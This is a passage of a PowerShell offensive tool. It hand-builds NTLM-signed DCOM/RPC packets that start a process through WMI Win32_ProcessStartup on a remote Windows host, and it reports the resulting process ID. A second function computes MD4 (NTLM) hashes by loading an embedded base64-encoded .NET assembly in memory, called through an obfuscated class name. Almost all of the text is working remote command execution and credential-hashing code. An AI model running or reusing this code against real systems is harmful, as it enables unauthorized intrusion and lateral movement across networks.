                                                0x44,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,
                                                0x00,0x00,0x00,0x59,0x01,0x00,0x00,0x5e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0xca,0x00,0x00,0x00,0x02,0x08,0x20,0x00,
                                                0x00,0x8c,0x00,0x00,0x00,0x11,0x01,0x00,0x00,0x11,0x03,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,
                                                0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x04,0x00,0x00,0x00,0x00,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,
                                                0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x00,0x00,0x73,0x74,
                                                0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,0x00,0x00,0x00,0x49,0x6e,
                                                0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,
                                                0x00,0x00,0x85,0x01,0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,
                                                0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0xe2,0x01,0x00,0x00,0x00,
                                                0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,0x50,0x72,0x6f,0x63,
                                                0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,0x68,0x72,0x65,0x61,
                                                0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x73,0x7c,0x43,
                                                0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x7c,
                                                0x6c,0x70,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x44,0x69,0x72,0x65,
                                                0x63,0x74,0x6f,0x72,0x79,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,
                                                0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,
                                                0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,
                                                0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,
                                                0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,
                                                0x2b,0x02,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0xda,0x01,0x00,0x00,
                                                0x00,0x49,0x44,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,
                                                0x03,0x08,0x00,0x00,0x00,0xba,0x02,0x00,0x00,0xac,0x01,0x00,0x00,
                                                0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x2b,0x02,0x00,0x00,0x02,0x08,
                                                0x20,0x00,0x00,0xda,0x01,0x00,0x00,0x72,0x02,0x00,0x00,0x11,0x03,
                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,
                                                0x67,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x49,0x6e,0x66,0x6f,
                                                0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x00,0x00,0x6f,0x62,0x6a,0x65,
                                                0x63,0x74,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,
                                                0x08,0x00,0x00,0x00,0xef,0x02,0x00,0x00,0x00,0x49,0x6e,0x00,0x0d,
                                                0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,
                                                0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,
                                                0xff,0xff,0x01,0x00,0x00,0x00,0x4c,0x03,0x00,0x00,0x00,0x57,0x4d,
                                                0x49,0x7c,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x00,0x00,0x4d,0x61,
                                                0x70,0x70,0x69,0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,
                                                0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x29,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,
                                                0x00,0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,
                                                0x00,0xff,0xff,0x66,0x03,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x44,
                                                0x03,0x00,0x00,0x00,0x49,0x44,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,
                                                0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,
                                                0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0xf5,0x03,0x00,0x00,0x16,
                                                0x03,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x66,0x03,0x00,
                                                0x00,0x02,0x08,0x20,0x00,0x00,0x44,0x03,0x00,0x00,0xad,0x03,0x00,
                                                0x00,0x11,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x6f,0x62,
                                                0x6a,0x65,0x63,0x74,0x3a,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,
                                                0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70 +
                                                (,0x00 * 501) +
                                                $command_length +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x0e,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01 +
                                                $command_length2 +
                                                0x00,0x80,0x00,0x5f,0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,
                                                0x52,0x53,0x00,0x00 +
                                                $command_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00
                                
                                if($Stub_data.Length -lt $request_split_index)
                                {
                                    $request_flags = 0x83
                                    $WMI_client_stage_next = 'Result'
                                }
                                else
                                {
                                    $request_split = $true
                                    $request_split_stage_final = [Math]::Ceiling($stub_data.Length / $request_split_index)

                                    if($request_split_stage -lt 2)
                                    {
                                        $request_length = $stub_data.Length
                                        $stub_data = $stub_data[0..($request_split_index - 1)]
                                        $request_split_stage = 2
                                        $sequence_number_counter = 10
                                        $request_flags = 0x81
                                        $request_split_index_tracker = $request_split_index
                                        $WMI_client_stage_next = 'Request'
                                    }
                                    elseif($request_split_stage -eq $request_split_stage_final)
                                    {
                                        $request_split = $false
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $request_split_stage = 0
                                        $stub_data = $stub_data[$request_split_index_tracker..$stub_data.Length]
                                        $request_flags = 0x82
                                        $WMI_client_stage_next = 'Result'
                                    }
                                    else
                                    {
                                        $request_length = $stub_data.Length - $request_split_index_tracker
                                        $stub_data = $stub_data[$request_split_index_tracker..($request_split_index_tracker + $request_split_index - 1)]
                                        $request_split_index_tracker += $request_split_index
                                        $request_split_stage++
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $sequence_number_counter++
                                        $request_flags = 0x80
                                        $WMI_client_stage_next = 'Request'
                                    }

                                }

                            }

                        }

                        $packet_RPC = Get-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID

                        if($request_split)
                        {
                            $packet_RPC["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($request_length)
                        }

                        $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier 
                        $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $stub_data + $NTLMSSP_verifier[0..($request_auth_padding + 7)])
                        $RPC_signature = $RPC_signature[0..7]
                        $packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = $RPC_signature
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                        $WMI_client_send = $RPC + $stub_data + $NTLMSSP_verifier
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()

                        if(!$request_split)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        }

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        $WMI_client_stage = $WMI_client_stage_next
                    }

                    'Result'
                    {

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        if($WMI_client_receive[1145] -ne 9)
                        { 
                            $target_process_ID = DataLength2 1141 $WMI_client_receive
                            Write-Output "Command executed with process ID $target_process_ID on $target_long"
                        }
                        else
                        {
                            Write-Output "Process did not start, check your command"
                        }

                        $WMI_client_stage = 'exit'
                    }

                }

                Start-Sleep -m $Sleep
            
            }

            $WMI_client_random_port.Close()
            $WMI_client_random_port_stream.Close()
        }

        $WMI_client.Close()
        $WMI_client_stream.Close()
    }

}

}

$asm = $null
Function Get-MD4Hash {
<#
.SYNOPSIS
    This cmdlet returns the MD4 hash of the data that is input.
    WARNING: MD4 is not secure, so it should NEVER be used to
    protect sensitive data. This cmdlet is for research purposes only!
 
.DESCRIPTION
    This cmdlet returns the MD4 hash of the data that is input.
    WARNING: MD4 is not secure, so it should NEVER be used to
    protect sensitive data. This cmdlet is for research purposes only!
    This cmdlet uses Microsoft's implementation of MD4, exported
    from bcrypt.dll. The implementation is fully compliant with
    RFC 1320. This cmdlet takes a byte array as input, not a string.
    So if you wanted to hash a string (such as a password,) you
    need to convert it to a byte array first.
 
.EXAMPLE
    Get-MD4Hash -DataToHash $([Text.Encoding]::Unicode.GetBytes("YourPassword1!"))
 
.PARAMETER DataToHash
    A byte array that represents the data that you want to hash.
 
.INPUTS
    A byte array containing the data you wish to hash.
 
.OUTPUTS
    A 128-bit hexadecimal string - the MD4 hash of your data.
 
.NOTES
    Author: Ryan Ries, 2014, ryan@myotherpcisacloud.com
 
.LINK
    https://myotherpcisacloud.com
#>
    [CmdletBinding()]
    Param ([Parameter(Mandatory=$True, ValueFromPipeline=$False)]          
           [Byte[]]$DataToHash)
    END
    {       
        Set-StrictMode -Version Latest
        
        if ($asm -ne "TRUE") {
            $script:asm = "TRUE"
            $ps = "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cnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUARmxhZ3NBdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJDcnlwdENyZWF0ZUhhc2gAcGhIYXNoAEJDcnlwdEZpbmlzaEhhc2gAQkNyeXB0RGVzdHJveUhhc2gATlRMTS5kbGwAYmNyeXB0LmRsbABTeXN0ZW0AcGhBbGdvcml0aG0ARW51bQBwc3pJbXBsZW1lbnRhdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyAEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlcgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAZHNhZmRzYWZkc2FmZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAQWxnT3BzRmxhZ3MAZHdGbGFncwBOVFN0YXR1cwBjYkhhc2hPYmplY3QAcGJIYXNoT2JqZWN0AGNiU2VjcmV0AHBiU2VjcmV0AGNiSW5wdXQAcGJJbnB1dAAAAAAAtj8gSZOvuUuS2/s0UZyJ+wAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECCLd6XFYZNOCJBAEAAAAECAAAAAQgAAAABAAAAAACKlACBgkDBhEMAwYREAkABBEQEBgODgkGAAIREBgJDAAHERAYEBgYCRgJCQUAAREQGAkABBEQGB0FCAkIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAACQEABE5UTE0AAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTgAACkBACRkZTc5YWUyNC1jM2M5LTQyZTctYmU3ZC1lYTk2NzI0OTcyMzgAAAwB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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAAkOgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            $dllbytes  = [System.Convert]::FromBase64String($ps)
            $assembly = [System.Reflection.Assembly]::Load($dllbytes)
        }

 
        [Byte[]]$HashBytes   = New-Object Byte[] 16
        [IntPtr]$PHAlgorithm = [IntPtr]::Zero
        [IntPtr]$PHHash      = [IntPtr]::Zero
        $NTStatus = [dsafdsafdsafds]::BCryptOpenAlgorithmProvider([Ref] $PHAlgorithm, 'MD4', $Null, 0)
        If ($NTStatus -NE 0)
        {
            Write-Error "BCryptOpenAlgorithmProvider failed with NTSTATUS $NTStatus"
            If ($PHAlgorithm -NE [IntPtr]::Zero)
            {
                $NTStatus = [dsafdsafdsafds]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0)
            }
            Return
        }
        $NTStatus = [dsafdsafdsafds]::BCryptCreateHash($PHAlgorithm, [Ref] $PHHash, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, 0)
        If ($NTStatus -NE 0)
        {
            Write-Error "BCryptCreateHash failed with NTSTATUS $NTStatus"
            If ($PHHash -NE [IntPtr]::Zero)
            {
                $NTStatus = [dsafdsafdsafds]::BCryptDestroyHash($PHHash)               
            }
            If ($PHAlgorithm -NE [IntPtr]::Zero)
            {
                $NTStatus = [dsafdsafdsafds]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0)
            }
            Return
        }
 
        $NTStatus = [dsafdsafdsafds]::BCryptHashData($PHHash, $DataToHash, $DataToHash.Length, 0)
        $NTStatus = [dsafdsafdsafds]::BCryptFinishHash($PHHash, $HashBytes, $HashBytes.Length, 0)
 
        If ($PHHash -NE [IntPtr]::Zero)
        {
            $NTStatus = [dsafdsafdsafds]::BCryptDestroyHash($PHHash)
        }
        If ($PHAlgorithm -NE [IntPtr]::Zero)
        {
            $NTStatus = [dsafdsafdsafds]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0)
        }
         
        $HashString = New-Object System.Text.StringBuilder
        Foreach ($Byte In $HashBytes)
        {
            [Void]$HashString.Append($Byte.ToString("X2"))
        }
        Return $HashString.ToString()
    }
}
